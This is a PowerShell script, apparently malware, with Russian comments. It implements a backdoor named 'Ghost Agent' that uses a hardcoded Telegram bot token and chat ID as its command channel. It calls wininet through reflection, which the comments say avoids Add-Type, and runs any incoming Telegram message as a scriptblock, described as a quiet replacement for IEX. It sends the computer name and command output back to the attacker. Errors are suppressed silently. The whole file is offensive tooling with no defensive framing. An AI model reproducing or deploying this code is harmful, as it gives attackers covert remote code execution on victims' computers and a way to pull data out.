# --- CONFIGURATION ---
$BotToken = "7954516260:AAF_dtgm2s8z9foCBjvuvCmzUtz1WTSUToo"
$ChatID   = "5703239051"
$UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

# --- REFLECTION ENGINE ---
# Динамическое создание методов WinAPI в памяти (без Add-Type)
function Get-WinAPIMethod {
    param([string]$Dll, [string]$MethodName, [type]$ReturnType, [type[]]$ParameterTypes)
    
    $AppDomain = [AppDomain]::CurrentDomain
    $AsmName = New-Object System.Reflection.AssemblyName("DynamicAssembly")
    $AsmBuilder = $AppDomain.DefineDynamicAssembly($AsmName, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
    $ModBuilder = $AsmBuilder.DefineDynamicModule("DynamicModule")
    $TypeBuilder = $ModBuilder.DefineType("InternalNativeMethods", "Public,Class")
    
    $MethodBuilder = $TypeBuilder.DefinePInvokeMethod(
        $MethodName, $Dll, "Public,Static,PinvokeImpl", 
        [System.Reflection.CallingConventions]::Standard, 
        $ReturnType, $ParameterTypes, 
        [System.Runtime.InteropServices.CallingConvention]::Winapi, 
        [System.Runtime.InteropServices.CharSet]::Auto
    )
    $MethodBuilder.SetImplementationFlags("PreserveSig")
    
    return $TypeBuilder.CreateType().GetMethod($MethodName)
}

# Маппинг типов и функций
$IntPtr = [IntPtr]; $Str = [string]; $Int = [int]; $Bool = [bool]; $ByteArr = [byte[]]

$NetOpen    = Get-WinAPIMethod "wininet.dll" "InternetOpen"    $IntPtr @($Str, $Int, $Str, $Str, $Int)
$NetConnect = Get-WinAPIMethod "wininet.dll" "InternetConnect" $IntPtr @($IntPtr, $Str, $Int, $Str, $Str, $Int, $Int, $Int)
$HttpOpen   = Get-WinAPIMethod "wininet.dll" "HttpOpenRequest" $IntPtr @($IntPtr, $Str, $Str, $Str, $Str, $IntPtr, $Int, $Int)
$HttpSend   = Get-WinAPIMethod "wininet.dll" "HttpSendRequest" $Bool   @($IntPtr, $Str, $Int, $ByteArr, $Int)
$NetRead    = Get-WinAPIMethod "wininet.dll" "InternetReadFile" $Bool   @($IntPtr, $ByteArr, $Int, [int].MakeByRefType())
$NetClose   = Get-WinAPIMethod "wininet.dll" "InternetCloseHandle" $Bool @($IntPtr)

function Invoke-GhostRequest {
    param([string]$Method, [string]$Path, [string]$Data)
    
    $hSession = $NetOpen.Invoke($null, [object[]]@($UserAgent, 1, [string]$null, [string]$null, 0))
    $hConnect = $NetConnect.Invoke($null, [object[]]@($hSession, "api.telegram.org", 443, [string]$null, [string]$null, 3, 0, 0))
    
    $Flags = 0x00800000 -bor 0x04000000 -bor 0x80000000 
    $hRequest = $HttpOpen.Invoke($null, [object[]]@($hConnect, $Method, $Path, [string]$null, [string]$null, $IntPtr::Zero, $Flags, 0))
    
    $Headers = "Content-Type: application/json`r`n"
    [byte[]]$PayloadBytes = if ($Data) { [System.Text.Encoding]::UTF8.GetBytes($Data) } else { [byte[]]@() }
    
    $SendArgs = [object[]]@($hRequest, $Headers, $Headers.Length, [byte[]]$PayloadBytes, $PayloadBytes.Length)
    $Success = $HttpSend.Invoke($null, $SendArgs)
    
    $Response = ""
    if ($Success) {
        [byte[]]$Buffer = New-Object byte[] 4096
        while ($true) {
            # Принудительное приведение типов для Reflection
            $ReadArgs = [object[]]@($hRequest, [byte[]]$Buffer, [int]$Buffer.Length, [int]0)
            if ($NetRead.Invoke($null, $ReadArgs) -and $ReadArgs[3] -gt 0) {
                $Response += [System.Text.Encoding]::UTF8.GetString($Buffer, 0, $ReadArgs[3])
            } else { break }
        }
    }

    $null = $NetClose.Invoke($null, @($hRequest))
    $null = $NetClose.Invoke($null, @($hConnect))
    $null = $NetClose.Invoke($null, @($hSession))
    
    return $Response
}

# --- MAIN LOGIC ---
$LastUpdateID = 0
$null = Invoke-GhostRequest "POST" "/bot$BotToken/sendMessage" (@{chat_id=$ChatID; text="Ghost Agent Started on $env:COMPUTERNAME"} | ConvertTo-Json)

while($true) {
    try {
        # Получение команд (Native GET)
        $RawUpdates = Invoke-GhostRequest "GET" "/bot$BotToken/getUpdates?offset=$($LastUpdateID + 1)" $null
        $Updates = $RawUpdates | ConvertFrom-Json 
        
        foreach ($Upd in $Updates.result) {
            $LastUpdateID = $Upd.update_id
            $Cmd = $Upd.message.text
            
            if ($null -ne $Cmd) {
                # Исполнение через ScriptBlock (тихая замена IEX)
                $ExecutionBlock = [scriptblock]::Create($Cmd)
                $Output = & $ExecutionBlock 2>&1 | Out-String
                
                if ([string]::IsNullOrWhiteSpace($Output)) { $Output = "Command executed (No output)." }
                
                # Отправка результата (Native POST)
                $Payload = @{ chat_id = $ChatID; text = "[$env:COMPUTERNAME]`n$Output" } | ConvertTo-Json
                $null = Invoke-GhostRequest "POST" "/bot$BotToken/sendMessage" $Payload
            }
        }
    } catch { }
    Start-Sleep -Seconds 5
}